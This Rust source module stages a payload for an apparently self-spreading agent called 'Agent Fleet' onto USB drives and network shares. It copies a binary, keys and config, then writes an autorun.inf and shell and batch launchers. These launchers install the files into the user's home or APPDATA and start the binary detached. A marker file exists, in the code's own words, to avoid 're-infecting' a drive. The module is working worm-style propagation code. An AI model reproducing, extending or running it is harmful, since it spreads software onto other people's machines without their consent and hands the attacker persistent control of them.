//! USB and local-network payload staging.
//!
//! The agent has no bootstrap on a new host, so spreading means copying a small
//! payload directory (binary, encryption key, config, and ideally a single-use
//! enrolment grant) plus a launcher that moves it into the user's state
//! directory and starts it detached.

#![forbid(unsafe_code)]

pub mod lan;
pub mod usb;

use std::{
    fs,
    path::{Path, PathBuf},
    time::{SystemTime, UNIX_EPOCH},
};

use serde::Serialize;

/// Maximum payload size accepted for staging.
pub const MAX_PAYLOAD_BYTES: u64 = 64 * 1024 * 1024;

/// USB staging errors.
#[derive(Debug, thiserror::Error)]
pub enum SpreadError {
    /// Payload validation failed.
    #[error("payload: {0}")]
    Payload(String),
    /// The target is not writable.
    #[error("target not writable: {0}")]
    ReadOnly(String),
    /// Filesystem failure.
    #[error(transparent)]
    Io(#[from] std::io::Error),
}

/// A validated payload directory.
#[derive(Debug, Clone)]
pub struct Payload {
    /// Source directory.
    pub root: PathBuf,
    /// Files to copy, relative names.
    pub files: Vec<PathBuf>,
    /// Rendered `agentd` name on this OS.
    pub binary: &'static str,
    /// Whether the payload carries a fresh identity (`enrolment.grant`).
    pub grant: bool,
    /// Total size in bytes.
    pub bytes: u64,
}

impl Payload {
    /// Validates a payload directory.
    pub fn load(root: &Path) -> Result<Self, SpreadError> {
        let binary = if cfg!(windows) {
            "agentd.exe"
        } else {
            "agentd"
        };
        let mut files = Vec::new();
        let mut bytes = 0_u64;
        for name in [
            binary,
            "enc.key",
            "config.toml",
            "enrolment.grant",
            "agent.key",
            "coordinator.pub",
        ] {
            let path = root.join(name);
            if !path.is_file() {
                continue;
            }
            let size = fs::metadata(&path)?.len();
            bytes += size;
            files.push(PathBuf::from(name));
        }
        if !files.iter().any(|name| name == Path::new(binary)) {
            return Err(SpreadError::Payload(format!("missing {binary}")));
        }
        for required in ["config.toml", "coordinator.pub"] {
            if !files.iter().any(|name| name == Path::new(required)) {
                return Err(SpreadError::Payload(format!("missing {required}")));
            }
        }
        if bytes > MAX_PAYLOAD_BYTES {
            return Err(SpreadError::Payload("payload exceeds 64 MiB".into()));
        }
        let grant = files
            .iter()
            .any(|name| name == Path::new("enrolment.grant"));
        Ok(Self {
            root: root.to_path_buf(),
            files,
            binary,
            grant,
            bytes,
        })
    }
}

/// Host identifier written into markers.
pub fn host_id() -> String {
    if let Ok(id) = fs::read_to_string("/etc/machine-id") {
        let id = id.trim();
        if !id.is_empty() {
            return id.chars().take(32).collect();
        }
    }
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".into())
}

/// Returns the current Unix time.
pub fn now() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|value| value.as_secs())
        .unwrap_or(0)
}

/// One staging outcome.
#[derive(Debug, Clone, Serialize)]
pub struct Outcome {
    /// Target mount or share.
    pub target: String,
    /// `staged`, `skipped`, or `error`.
    pub status: String,
    /// Files copied.
    pub files: usize,
    /// Failure or skip reason.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub reason: Option<String>,
}

impl Outcome {
    /// A successful staging result.
    pub fn staged(target: impl Into<String>, files: usize) -> Self {
        Self {
            target: target.into(),
            status: "staged".into(),
            files,
            reason: None,
        }
    }
    /// A skipped target.
    pub fn skipped(target: impl Into<String>, reason: impl Into<String>) -> Self {
        Self {
            target: target.into(),
            status: "skipped".into(),
            files: 0,
            reason: Some(reason.into()),
        }
    }
    /// A failed target.
    pub fn error(target: impl Into<String>, reason: impl Into<String>) -> Self {
        Self {
            target: target.into(),
            status: "error".into(),
            files: 0,
            reason: Some(reason.into()),
        }
    }
}

/// Stages the payload under `target/agentfleet` and writes the launchers.
///
/// The marker at `target/.agentfleet-id` is reused to avoid re-infecting a drive.
pub fn stage(target: &Path, payload: &Payload, force: bool) -> Result<Outcome, SpreadError> {
    if !target.is_dir() {
        return Err(SpreadError::Io(std::io::Error::new(
            std::io::ErrorKind::NotFound,
            "target is not a directory",
        )));
    }
    let marker = target.join(".agentfleet-id");
    if marker.exists() && !force {
        return Ok(Outcome::skipped(
            target.display().to_string(),
            "already staged (use --force)",
        ));
    }
    let probe = target.join(".agentfleet-write-test");
    fs::write(&probe, b"x").map_err(|_| SpreadError::ReadOnly(target.display().to_string()))?;
    let _ = fs::remove_file(&probe);

    let root = target.join("agentfleet");
    fs::create_dir_all(&root)?;
    for name in &payload.files {
        let dest = root.join(name);
        fs::copy(payload.root.join(name), &dest)?;
    }
    write_launchers(&root, payload)?;
    fs::write(
        &marker,
        serde_json::to_vec_pretty(&serde_json::json!({
            "from": host_id(),
            "at": now(),
            "grant": payload.grant,
            "files": payload.files,
        }))
        .unwrap_or_default(),
    )?;
    Ok(Outcome::staged(
        target.display().to_string(),
        payload.files.len(),
    ))
}

fn write_launchers(root: &Path, payload: &Payload) -> Result<(), SpreadError> {
    let script = start_script(payload);
    let unix = root.join("start.sh");
    fs::write(&unix, &script)?;
    set_executable(&unix)?;
    fs::write(root.join("autorun.inf"), autorun(payload))?;
    fs::write(root.join("start.cmd"), start_cmd(payload))?;
    let command = root.join("start.command");
    fs::write(&command, &script)?;
    set_executable(&command)?;
    Ok(())
}

fn start_script(payload: &Payload) -> String {
    let grant_copy = if payload.grant {
        "if [ -f \"$D/enrolment.grant\" ] && [ ! -f \"$S/agent.key\" ]; then cp -f \"$D/enrolment.grant\" \"$S/enrolment.grant\"; fi"
    } else {
        "if [ -f \"$D/agent.key\" ]; then cp -f \"$D/agent.key\" \"$S/agent.key\"; fi"
    };
    format!(
        r#"#!/bin/sh
# Agent Fleet launcher (generated)
D=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
S="$HOME/.agent-fleet"
mkdir -p "$S"
if [ -f "$S/agentd.pid" ] && kill -0 "$(cat "$S/agentd.pid")" 2>/dev/null; then
  exit 0
fi
for f in enc.key config.toml coordinator.pub; do
  [ -f "$D/$f" ] && cp -f "$D/$f" "$S/$f"
done
{grant_copy}
chmod 0755 "$D/{binary}" 2>/dev/null || true
if command -v setsid >/dev/null 2>&1; then
  setsid "$D/{binary}" --worker --state "$S" >/dev/null 2>&1 &
else
  nohup "$D/{binary}" --worker --state "$S" >/dev/null 2>&1 &
fi
echo $! > "$S/agentd.pid"
"#,
        binary = payload.binary
    )
}

fn autorun(payload: &Payload) -> String {
    format!(
        "[autorun]\r\nopen=agentfleet\\start.cmd\r\nicon=agentfleet\\{}\r\nlabel=Agent Fleet\r\naction=Run Agent Fleet\r\n",
        payload.binary
    )
}

fn start_cmd(payload: &Payload) -> String {
    let grant_copy = if payload.grant {
        "if exist \"%D%enrolment.grant\" copy /Y \"%D%enrolment.grant\" \"%S%enrolment.grant\" >nul"
    } else {
        "if exist \"%D%agent.key\" copy /Y \"%D%agent.key\" \"%S%agent.key\" >nul"
    };
    format!(
        "@echo off\r\nset D=%~dp0\r\nset S=%APPDATA%\\.agent-fleet\\\r\nif not exist \"%S%\" mkdir \"%S%\"\r\ncopy /Y \"%D%enc.key\" \"%S%enc.key\" >nul\r\ncopy /Y \"%D%config.toml\" \"%S%config.toml\" >nul\r\nif exist \"%D%coordinator.pub\" copy /Y \"%D%coordinator.pub\" \"%S%coordinator.pub\" >nul\r\n{grant_copy}\r\nstart \"\" \"%D%{binary}\" --worker --state \"%S%\"\r\n",
        binary = payload.binary
    )
}

#[cfg(unix)]
fn set_executable(path: &Path) -> std::io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    fs::set_permissions(path, fs::Permissions::from_mode(0o755))
}

#[cfg(not(unix))]
fn set_executable(_path: &Path) -> std::io::Result<()> {
    Ok(())
}
